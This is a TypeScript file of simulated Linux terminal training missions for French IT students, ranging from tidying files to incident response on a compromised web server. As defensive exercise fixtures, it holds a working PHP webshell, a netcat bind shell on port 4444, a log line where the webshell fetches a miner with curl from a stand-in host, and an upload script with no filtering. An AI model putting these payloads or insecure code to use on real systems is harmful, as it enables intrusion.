/**
 * Missions de terminal Linux (machine simulée côté serveur, voir lib/terminal/shell.ts).
 * Chaque mission raconte une petite histoire et se note sur l'état final de la machine :
 * fichiers rangés, processus arrêtés, droits corrigés, preuves mises de côté.
 * B1 : tout est expliqué à l'écran. B3 : administration, fin de BTS SIO (tickets, sans aide). Mastère : réponse à incident.
 */
import type { Scenario } from "@/lib/terminal/shell";

export type Mission = { key: string; level: "b1" | "b3" | "m1"; domain: string; minutes: number; prompt: string; scenario: Scenario };

const IMG = "(image JPEG)\n";

/* ------------------------------------------------------------------ B1 */

const rangement: Scenario = {
  user: "stagiaire", hostname: "pc-accueil", home: "/home/stagiaire",
  motd: [
    "Bienvenue sur le PC de l'accueil (terminal Linux simulé). On tape une commande, puis Entrée.",
    "Les commandes utiles :",
    "  ls                     liste ce qu'il y a ici",
    "  cd Telechargements     entre dans un dossier ; cd .. remonte d'un cran ; cd tout seul revient au départ",
    "  cat fichier            affiche un fichier",
    "  mkdir Images           crée un dossier",
    "  mv fichier dossier/    déplace un fichier ; mv *.jpg Images/ déplace tous les .jpg d'un coup",
    "  rm fichier             supprime un fichier",
    "  echo Camille > fait_par.txt   écrit « Camille » dans le fichier fait_par.txt",
    "Commencez par : cat LISEZMOI.txt",
  ].join("\n"),
  files: {
    "/home/stagiaire/LISEZMOI.txt": "Mission : le dossier Telechargements est un vrai bazar.\n1. Créez les dossiers Images et Documents (ici, dans votre dossier personnel).\n2. Rangez les photos (.jpg) dans Images et les documents (.pdf) dans Documents.\n3. Un des fichiers se fait passer pour un PDF mais n'en est pas un : c'est un virus. Supprimez-le (ne le rangez pas !).\n4. Signez votre travail : écrivez votre prénom dans le fichier fait_par.txt.\nAstuce : la note du chef, dans Telechargements, vous aidera.\n",
    "/home/stagiaire/Telechargements/note_du_chef.txt": "Regarde bien la FIN des noms de fichiers : c'est elle qui dit ce qu'est vraiment un fichier.\nUn fichier qui finit par .exe est un programme, même s'il y a .pdf au milieu du nom.\n",
    "/home/stagiaire/Telechargements/vacances_plage.jpg": IMG,
    "/home/stagiaire/Telechargements/chat_du_bde.jpg": IMG,
    "/home/stagiaire/Telechargements/selfie_rentree.jpg": IMG,
    "/home/stagiaire/Telechargements/cours_reseau.pdf": "(document PDF : cours de réseau)\n",
    "/home/stagiaire/Telechargements/planning_novembre.pdf": "(document PDF : planning)\n",
    "/home/stagiaire/Telechargements/facture_EDF.pdf.exe": "MZ\u0090 programme Windows déguisé en facture : ne pas ouvrir.\n",
  },
  objectives: [
    { id: "dossiers", title: "Créer les dossiers Images et Documents", check: { type: "all", checks: [
      { type: "exists", path: "Images", kind: "dir" }, { type: "exists", path: "Documents", kind: "dir" }] } },
    { id: "photos", title: "Ranger les 3 photos dans Images", check: { type: "all", checks: ["vacances_plage", "chat_du_bde", "selfie_rentree"].flatMap((n) => [
      { type: "exists" as const, path: `Images/${n}.jpg` }, { type: "absent" as const, path: `Telechargements/${n}.jpg` }]) } },
    { id: "docs", title: "Ranger les 2 vrais PDF dans Documents", check: { type: "all", checks: ["cours_reseau", "planning_novembre"].flatMap((n) => [
      { type: "exists" as const, path: `Documents/${n}.pdf` }, { type: "absent" as const, path: `Telechargements/${n}.pdf` }]) } },
    { id: "virus", title: "Supprimer le faux PDF (le virus), sans le ranger", check: { type: "all", checks: [
      { type: "absent", path: "Telechargements/facture_EDF.pdf.exe" }, { type: "absent", path: "Documents/facture_EDF.pdf.exe" }, { type: "absent", path: "Images/facture_EDF.pdf.exe" }] } },
    { id: "signe", title: "Écrire son prénom dans fait_par.txt", check: { type: "exists", path: "fait_par.txt", kind: "file" } },
  ],
};

const pcLent: Scenario = {
  user: "eleve", hostname: "pc-salle-12", home: "/home/eleve",
  motd: "Connexion SSH au poste pc-salle-12. Un ticket vous attend : cat LISEZMOI.txt\nTapez help pour les commandes disponibles.",
  files: {
    "/home/eleve/LISEZMOI.txt": "TICKET #2051 · Demandeur : salle 12\n\nLe poste rame énormément depuis hier, le ventilateur souffle à fond.\nL'élève travaille sur son exposé : ne fermez pas ses applications (navigateur, musique).\n\nÀ faire :\n1. Identifier et arrêter ce qui consomme le processeur.\n2. Empêcher qu'il revienne au prochain démarrage.\n3. Noter le nom du programme en cause dans ~/rapport.txt pour le RSSI.\n",
    "/home/eleve/Documents/expose_histoire.txt": "Exposé sur la Révolution française, à finir pour lundi.\n",
    "/home/eleve/.config/navigateur/favoris.txt": "https://www.wikipedia.org\nhttps://www.cybersup.ai\n",
    "/home/eleve/.demarrage/lancer_minage.sh": "#!/bin/bash\n# relance le mineur à chaque démarrage\n/home/eleve/.cache/minage_crypto --pool pool.argent-facile.example:3333 &\n",
    "/home/eleve/.cache/minage_crypto": "(programme)\n",
  },
  processes: [
    { pid: 1, user: "root", cmd: "/sbin/init", cpu: 0.1 },
    { pid: 812, cmd: "navigateur --onglets 7", cpu: 1.8, mem: 12.4 },
    { pid: 977, cmd: "musique --playlist revisions", cpu: 0.6, mem: 2.1 },
    { pid: 1337, cmd: "/home/eleve/.cache/minage_crypto --pool pool.argent-facile.example:3333", cpu: 97.3, mem: 8.8 },
    { pid: 1402, cmd: "bash", cpu: 0.0, mem: 0.3 },
  ],
  objectives: [
    { id: "stop", title: "Arrêter le programme qui fait ramer le PC", check: { type: "process_absent", name: "minage_crypto" } },
    { id: "garder", title: "Laisser tourner le navigateur et la musique", check: { type: "all", checks: [
      { type: "process_present", name: "navigateur" }, { type: "process_present", name: "musique" }, { type: "process_absent", name: "minage_crypto" }] } },
    { id: "relance", title: "Supprimer le fichier caché qui le relance", check: { type: "absent", path: ".demarrage/lancer_minage.sh" } },
    { id: "rapport", title: "Écrire le nom du coupable dans rapport.txt", check: { type: "contains", path: "rapport.txt", text: "minage" } },
  ],
};

/* ------------------------------------------------------------------ B3 */

const siteEnPanne: Scenario = {
  user: "tech", hostname: "srv-web", home: "/home/tech",
  motd: "Connexion SSH à srv-web (Debian 12). Un ticket vous attend : cat TICKET-2047.txt\nVous pouvez utiliser sudo pour certaines commandes : sudo -l pour la liste. Tapez help pour les commandes disponibles.",
  files: {
    "/home/tech/TICKET-2047.txt": "TICKET #2047 · Priorité haute · Demandeur : service communication\n\nLe site www.ecole.example ne s'affiche plus depuis la mise à jour de ce matin.\n\nÀ faire :\n1. Trouver la cause dans le journal d'erreurs d'Apache (/var/log/apache2/).\n2. AVANT de modifier quoi que ce soit, sauvegarder le fichier de configuration du site dans ~/sauvegardes/.\n3. Corriger la configuration.\n4. Au passage, l'audit de la semaine dernière signalait que le fichier de configuration PHP du site\n   (qui contient le mot de passe de la base) est lisible par tout le monde : droits à passer en 640.\n5. L'audit signalait aussi un programme qui écoute sur un port inhabituel (ss -tlnp) : à arrêter.\n",
    "/var/log/apache2/error.log": "[Tue Nov 03 06:58:02 2026] [notice] caught SIGTERM, shutting down\n[Tue Nov 03 07:02:11 2026] [error] AH00526: Syntax error on line 4 of /etc/apache2/sites-enabled/ecole.conf:\n[Tue Nov 03 07:02:11 2026] [error] Invalid command 'DocumentRot', perhaps misspelled or defined by a module not included in the server configuration\n[Tue Nov 03 07:02:11 2026] [error] Action 'start' failed.\n",
    "/var/log/apache2/access.log": "10.0.0.31 - - [02/Nov/2026:17:12:03 +0100] \"GET / HTTP/1.1\" 200 5120\n10.0.0.44 - - [02/Nov/2026:17:15:40 +0100] \"GET /inscriptions HTTP/1.1\" 200 8210\n",
    "/etc/apache2/sites-enabled/ecole.conf": { content: "<VirtualHost *:80>\n    ServerName www.ecole.example\n    ServerAdmin webmaster@ecole.example\n    DocumentRot /var/www/ecole\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n</VirtualHost>\n", owner: "root", mode: "644" },
    "/etc/apache2/apache2.conf": { content: "# Configuration principale d'Apache\nIncludeOptional sites-enabled/*.conf\n", owner: "root", mode: "644" },
    "/var/www/ecole/index.php": { content: "<?php require 'config.php'; echo 'Bienvenue sur le site de l\\'école'; ?>\n", owner: "www-data", mode: "644" },
    "/var/www/ecole/config.php": { content: "<?php\n$db_host = '10.0.0.12';\n$db_user = 'site_ecole';\n$db_pass = 'Ecole!2026-prod';\n", owner: "www-data", mode: "644" },
  },
  processes: [
    { pid: 1, user: "root", cmd: "/sbin/init", cpu: 0.1 },
    { pid: 455, user: "root", cmd: "/usr/sbin/sshd -D", cpu: 0.0 },
    { pid: 2231, user: "www-data", cmd: "nc -lvnp 4444 -e /bin/bash", cpu: 0.0, mem: 0.1 },
    { pid: 2604, cmd: "-bash", cpu: 0.0 },
  ],
  listen: [{ port: 22, process: "sshd" }, { port: 4444, process: "nc" }],
  sudo: ["sed", "chmod", "kill", "cp", "cat", "ls"],
  objectives: [
    { id: "sauvegarde", title: "Sauvegarder la configuration d'origine dans ~/sauvegardes/", check: { type: "contains", path: "sauvegardes/ecole.conf", text: "DocumentRot /var/www/ecole" } },
    { id: "correction", title: "Corriger l'erreur de configuration du site", check: { type: "all", checks: [
      { type: "contains", path: "/etc/apache2/sites-enabled/ecole.conf", text: "    DocumentRoot /var/www/ecole" },
      { type: "contains", path: "/etc/apache2/sites-enabled/ecole.conf", text: "ServerName www.ecole.example" }] } },
    { id: "droits", title: "Passer config.php en 640", check: { type: "mode", path: "/var/www/ecole/config.php", mode: "640" } },
    { id: "porte", title: "Arrêter le programme qui écoute sur le port inhabituel", check: { type: "process_absent", name: "nc -lvnp" } },
  ],
};

const nouvelleArrivee: Scenario = {
  user: "admin", hostname: "srv-fichiers", home: "/home/admin",
  motd: "Connexion SSH à srv-fichiers, le serveur de partage de l'école. Vos demandes du jour : cat ~/demandes.txt\nTapez help pour les commandes disponibles.",
  dirs: [{ path: "/srv/partage", owner: "admin" }, { path: "/srv/partage/compta", owner: "admin" }, { path: "/srv/partage/commun", owner: "admin" }, { path: "/srv/partage/direction", owner: "admin" }, { path: "/srv/partage/temp", owner: "admin" }, { path: "/srv/modeles", owner: "admin" }],
  files: {
    "/home/admin/demandes.txt": "Demandes du jour\n\n1. Julie Martin arrive à la comptabilité lundi. Créez son dossier /srv/partage/compta/julie,\n   déposez-y le document d'accueil (modèle dans /srv/modeles/), et faites en sorte que\n   personne d'autre que le propriétaire ne puisse y entrer (droits 700).\n2. Audit RGPD : des mots de passe traînent en clair dans le partage. Retrouvez TOUS les fichiers\n   de /srv/partage qui contiennent « mot de passe » et déplacez-les dans ~/quarantaine/.\n3. Le dossier /srv/partage/temp est plein : supprimez tous les fichiers .tmp, mais gardez le journal.\n",
    "/srv/modeles/bienvenue.txt": { content: "Bienvenue dans l'équipe !\nVotre identifiant vous sera remis par le service informatique.\n", owner: "admin" },
    "/srv/partage/compta/factures_octobre.csv": { content: "fournisseur;montant\nImprimerie;420\n", owner: "admin" },
    "/srv/partage/commun/wifi_invites.txt": { content: "Réseau : ECOLE-INVITES\nMot de passe : Bienvenue2026\n", owner: "admin" },
    "/srv/partage/commun/menu_cantine.txt": { content: "Lundi : lasagnes\nMardi : poisson\n", owner: "admin" },
    "/srv/partage/direction/acces_banque.txt": { content: "Banque en ligne de l'école\nidentifiant : direction-ecole\nmot de passe : Tresor#77\n", owner: "admin" },
    "/srv/partage/direction/budget_2027.txt": { content: "Budget prévisionnel, version 3\n", owner: "admin" },
    "/srv/partage/temp/export_1.tmp": { content: "x\n", owner: "admin" },
    "/srv/partage/temp/export_2.tmp": { content: "x\n", owner: "admin" },
    "/srv/partage/temp/cache_impression.tmp": { content: "x\n", owner: "admin" },
    "/srv/partage/temp/sauvegarde.log": { content: "sauvegarde OK 02/11\n", owner: "admin" },
  },
  objectives: [
    { id: "dossier", title: "Créer le dossier de Julie avec le document d'accueil", check: { type: "all", checks: [
      { type: "exists", path: "/srv/partage/compta/julie", kind: "dir" }, { type: "contains", path: "/srv/partage/compta/julie/bienvenue.txt", text: "Bienvenue" }] } },
    { id: "droits", title: "Dossier de Julie en 700", check: { type: "mode", path: "/srv/partage/compta/julie", mode: "700" } },
    { id: "quarantaine", title: "Mettre en quarantaine tous les fichiers avec un mot de passe", check: { type: "all", checks: [
      { type: "exists", path: "quarantaine/wifi_invites.txt" }, { type: "exists", path: "quarantaine/acces_banque.txt" },
      { type: "absent", path: "/srv/partage/commun/wifi_invites.txt" }, { type: "absent", path: "/srv/partage/direction/acces_banque.txt" },
      { type: "exists", path: "/srv/partage/commun/menu_cantine.txt" }, { type: "exists", path: "/srv/partage/direction/budget_2027.txt" }] } },
    { id: "temp", title: "Vider les .tmp en gardant le journal", check: { type: "all", checks: [
      { type: "absent", path: "/srv/partage/temp/export_1.tmp" }, { type: "absent", path: "/srv/partage/temp/export_2.tmp" },
      { type: "absent", path: "/srv/partage/temp/cache_impression.tmp" }, { type: "exists", path: "/srv/partage/temp/sauvegarde.log" }] } },
  ],
};


const sauvegarde: Scenario = {
  user: "tech", hostname: "srv-backup", home: "/home/tech",
  motd: "Connexion SSH à srv-backup. Un ticket vous attend : cat TICKET-2077.txt\nTapez help pour les commandes disponibles (sudo -l pour ce que vous pouvez faire en root).",
  disks: [{ mount: "/", device: "/dev/sda1", size_mb: 30720, base_mb: 6200 }, { mount: "/var", device: "/dev/sdb1", size_mb: 20480, base_mb: 2800 }],
  files: {
    "/home/tech/TICKET-2077.txt": "TICKET #2077 · Priorité haute · Demandeur : direction\n\nLa sauvegarde automatique du serveur de fichiers échoue depuis trois nuits.\nLe service s'appelle « sauvegarde-nuit ».\n\nÀ faire :\n1. Trouver pourquoi le service est en échec (son état et son journal).\n2. Corriger la cause, SANS supprimer les sauvegardes déjà faites ni les journaux du mois en cours.\n3. Relancer le service et vérifier qu'il tourne.\n4. L'audit a aussi relevé qu'il ne redémarre pas tout seul après un redémarrage du serveur : corrigez-le.\n",
    "/var/log/syslog": { content: "nov. 04 02:00:01 srv-backup CRON[2201]: (root) CMD (systemctl start sauvegarde-nuit)\nnov. 04 02:00:03 srv-backup sauvegarde-nuit[2210]: tar: /var/backups/sauvegarde-2026-11-04.tar.gz: écriture impossible: No space left on device\n", owner: "root", mode: "644", size: 40 },
    "/var/log/auth.log": { content: "nov. 04 08:55:12 srv-backup sshd[2390]: Accepted publickey for tech from 10.0.99.14\n", owner: "root", mode: "640", size: 12 },
    "/var/log/ancien/debug-2026-07.log.gz": { content: "(archive compressée de journaux de débogage, juillet)\n", owner: "root", mode: "644", size: 5800 },
    "/var/log/ancien/debug-2026-08.log.gz": { content: "(archive compressée de journaux de débogage, août)\n", owner: "root", mode: "644", size: 5900 },
    "/var/log/ancien/debug-2026-09.log.gz": { content: "(archive compressée de journaux de débogage, septembre)\n", owner: "root", mode: "644", size: 5600 },
    "/var/log/ancien/LISEZMOI": { content: "Archives de débogage de l'ancienne application, conservées « au cas où ». Plus utilisées depuis la migration de juin.\n", owner: "root", mode: "644" },
    "/var/backups/sauvegarde-2026-10-31.tar.gz": { content: "(sauvegarde complète)\n", owner: "root", mode: "600", size: 30 },
    "/var/backups/sauvegarde-2026-11-01.tar.gz": { content: "(sauvegarde complète)\n", owner: "root", mode: "600", size: 30 },
    "/etc/systemd/system/sauvegarde-nuit.service": { content: "[Unit]\nDescription=Sauvegarde nocturne du serveur de fichiers\n\n[Service]\nExecStart=/usr/local/bin/sauvegarde.sh\n\n[Install]\nWantedBy=multi-user.target\n", owner: "root", mode: "644" },
  },
  dirs: [{ path: "/var/log/ancien", owner: "root" }, { path: "/var/backups", owner: "root", mode: "755" }],
  services: [
    { name: "ssh", description: "OpenBSD Secure Shell server", active: true, enabled: true, log: ["nov. 04 08:55:12 srv-backup sshd[2390]: Accepted publickey for tech from 10.0.99.14"] },
    { name: "cron", description: "Regular background program processing daemon", active: true, enabled: true, log: ["nov. 04 02:00:01 srv-backup CRON[2201]: (root) CMD (systemctl start sauvegarde-nuit)"] },
    { name: "sauvegarde-nuit", description: "Sauvegarde nocturne du serveur de fichiers", active: false, enabled: false,
      log: ["nov. 02 02:00:03 srv-backup sauvegarde-nuit[1880]: tar: écriture impossible: No space left on device", "nov. 03 02:00:03 srv-backup sauvegarde-nuit[2044]: tar: écriture impossible: No space left on device",
        "nov. 04 02:00:03 srv-backup sauvegarde-nuit[2210]: tar: /var/backups/sauvegarde-2026-11-04.tar.gz: écriture impossible: No space left on device", "nov. 04 02:00:03 srv-backup systemd[1]: sauvegarde-nuit.service: Failed with result 'exit-code'."],
      requires: { type: "disk_below", mount: "/var", percent: 90 }, fail: "tar: écriture impossible: No space left on device" },
  ],
  crontab: "0 2 * * * systemctl start sauvegarde-nuit",
  sudo: ["systemctl", "rm", "du", "ls", "cat", "journalctl"],
  objectives: [
    { id: "place", title: "Libérer de la place sur /var", check: { type: "disk_below", mount: "/var", percent: 90 } },
    { id: "garder", title: "Garder les sauvegardes et les journaux en cours", check: { type: "all", checks: [
      { type: "exists", path: "/var/backups/sauvegarde-2026-10-31.tar.gz" }, { type: "exists", path: "/var/backups/sauvegarde-2026-11-01.tar.gz" },
      { type: "exists", path: "/var/log/syslog" }, { type: "exists", path: "/var/log/auth.log" }, { type: "disk_below", mount: "/var", percent: 90 }] } },
    { id: "relance", title: "Service sauvegarde-nuit relancé et actif", check: { type: "service_active", name: "sauvegarde-nuit" } },
    { id: "boot", title: "Service activé au démarrage du serveur", check: { type: "service_enabled", name: "sauvegarde-nuit" } },
  ],
};

/* -------------------------------------------------------------- Mastère */

export const WEBSHELL = "<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>\n";
const LEGIT_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7deployEcoleKey0000000000000000000 deploy@ci-ecole";

const compromis: Scenario = {
  user: "analyste", hostname: "srv-prod", home: "/home/analyste",
  motd: "Connexion SSH à srv-prod. Alerte en cours : cat ~/ALERTE-SOC.txt\nsudo est disponible pour certaines commandes (sudo -l).",
  dirs: [{ path: "/var/www/html/uploads", owner: "www-data" }, { path: "/home/deploy/.ssh", owner: "deploy", mode: "700" }],
  files: {
    "/home/analyste/ALERTE-SOC.txt": "ALERTE SOC · srv-prod · criticité haute\n\nL'EDR signale un processus inconnu à 99 % de CPU et des connexions sortantes vers un pool de minage.\nHypothèse : un fichier PHP malveillant a été déposé via le formulaire d'envoi d'avatars.\n\nVotre mission (gardez les preuves, ne détruisez pas le webshell) :\n1. Trouver le webshell dans /var/www/html et le déplacer dans ~/preuves/.\n2. Enregistrer son empreinte SHA-256 dans ~/preuves/empreintes.txt.\n3. Retrouver dans les journaux web l'IP qui a utilisé le webshell, l'écrire dans ~/preuves/ip_attaquant.txt.\n4. Arrêter le mineur et supprimer son dossier.\n5. L'attaquant a ajouté sa clé SSH au compte deploy : retirez-la, en gardant la clé légitime.\n",
    "/var/www/html/index.php": { content: "<?php include 'header.php'; ?>\n<h1>Espace étudiants</h1>\n", owner: "www-data" },
    "/var/www/html/upload.php": { content: "<?php move_uploaded_file($_FILES['avatar']['tmp_name'], 'uploads/' . $_FILES['avatar']['name']); ?>\n", owner: "www-data" },
    "/var/www/html/uploads/photo_lea.jpg": { content: IMG, owner: "www-data" },
    "/var/www/html/uploads/photo_karim.jpg": { content: IMG, owner: "www-data" },
    "/var/www/html/uploads/avatar.php": { content: WEBSHELL, owner: "www-data" },
    "/var/log/apache2/access.log": { content: [
      "10.0.0.31 - - [03/Nov/2026:09:12:03 +0100] \"GET /index.php HTTP/1.1\" 200 5120",
      "10.0.0.44 - - [03/Nov/2026:09:20:17 +0100] \"POST /upload.php HTTP/1.1\" 200 88",
      "198.51.100.23 - - [03/Nov/2026:09:41:55 +0100] \"GET /index.php HTTP/1.1\" 200 5120",
      "203.0.113.66 - - [03/Nov/2026:10:02:31 +0100] \"POST /upload.php HTTP/1.1\" 200 88",
      "203.0.113.66 - - [03/Nov/2026:10:02:48 +0100] \"GET /uploads/avatar.php?cmd=id HTTP/1.1\" 200 54",
      "203.0.113.66 - - [03/Nov/2026:10:03:10 +0100] \"GET /uploads/avatar.php?cmd=curl%20-o%20/tmp/.x/kworkerd%20http://dl.example/k HTTP/1.1\" 200 0",
      "10.0.0.31 - - [03/Nov/2026:10:15:42 +0100] \"GET /uploads/photo_lea.jpg HTTP/1.1\" 200 40211",
    ].join("\n") + "\n", owner: "root", mode: "644" },
    "/tmp/.x/kworkerd": { content: "(binaire ELF)\n", owner: "www-data" },
    "/tmp/.x/config.json": { content: "{\"pool\": \"pool.minexmr.example:4444\", \"wallet\": \"4AbC…\"}\n", owner: "www-data" },
    "/home/deploy/.ssh/authorized_keys": { content: `${LEGIT_KEY}\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpirate0000000000000000000000000 pirate@kali\n`, owner: "deploy", mode: "600" },
  },
  processes: [
    { pid: 1, user: "root", cmd: "/sbin/init", cpu: 0.1 },
    { pid: 690, user: "root", cmd: "/usr/sbin/apache2 -k start", cpu: 0.4 },
    { pid: 4242, user: "www-data", cmd: "/tmp/.x/kworkerd -c /tmp/.x/config.json", cpu: 99.1, mem: 14.2 },
    { pid: 5010, cmd: "-bash", cpu: 0.0 },
  ],
  sudo: ["mv", "rm", "kill", "sed", "cat", "ls", "grep", "find", "sha256sum"],
  objectives: [
    { id: "webshell", title: "Webshell déplacé dans ~/preuves/ (pas supprimé)", check: { type: "all", checks: [
      { type: "contains", path: "preuves/avatar.php", text: "system($_GET" }, { type: "absent", path: "/var/www/html/uploads/avatar.php" }] } },
    { id: "empreinte", title: "Empreinte SHA-256 du webshell dans ~/preuves/empreintes.txt", check: { type: "contains", path: "preuves/empreintes.txt", text: "1e12386948a2464baf0c17904b45e858ef467c466bd6888e8d6bff681877575a" } },
    { id: "ip", title: "IP de l'attaquant dans ~/preuves/ip_attaquant.txt", check: { type: "contains", path: "preuves/ip_attaquant.txt", text: "203.0.113.66" } },
    { id: "mineur", title: "Mineur arrêté et son dossier supprimé", check: { type: "all", checks: [
      { type: "process_absent", name: "kworkerd" }, { type: "absent", path: "/tmp/.x" }, { type: "process_present", name: "apache2" }] } },
    { id: "cle", title: "Clé SSH de l'attaquant retirée, clé légitime conservée", check: { type: "equals", path: "/home/deploy/.ssh/authorized_keys", text: LEGIT_KEY } },
  ],
};

export const MISSIONS: Mission[] = [
  { key: "rangement", level: "b1", domain: "Fonctionnement du numérique", minutes: 7, scenario: rangement,
    prompt: "Mission terminal : rangez le PC de l'accueil et débusquez le faux fichier. Toutes les commandes sont expliquées à l'écran." },
  { key: "pc-lent", level: "b3", domain: "Systèmes", minutes: 6, scenario: pcLent,
    prompt: "Mission terminal : un poste de la salle 12 rame. Traitez le ticket sans gêner l'élève qui travaille dessus." },
  { key: "site-panne", level: "b3", domain: "Systèmes", minutes: 10, scenario: siteEnPanne,
    prompt: "Mission terminal : le site de l'école est en panne. Traitez le ticket sur le serveur web, proprement (sauvegarde avant modification)." },
  { key: "partage", level: "b3", domain: "Systèmes", minutes: 9, scenario: nouvelleArrivee,
    prompt: "Mission terminal : traitez les demandes du jour sur le serveur de fichiers (arrivée d'une collaboratrice, audit des mots de passe, nettoyage)." },
  { key: "sauvegarde", level: "b3", domain: "Systèmes", minutes: 9, scenario: sauvegarde,
    prompt: "Mission terminal : la sauvegarde de nuit échoue depuis trois nuits. Trouvez la cause, corrigez proprement et remettez le service en route." },
  { key: "compromis", level: "m1", domain: "Cybersécurité", minutes: 12, scenario: compromis,
    prompt: "Mission terminal : un serveur de production est compromis. Menez la réponse à incident en conservant les preuves." },
];
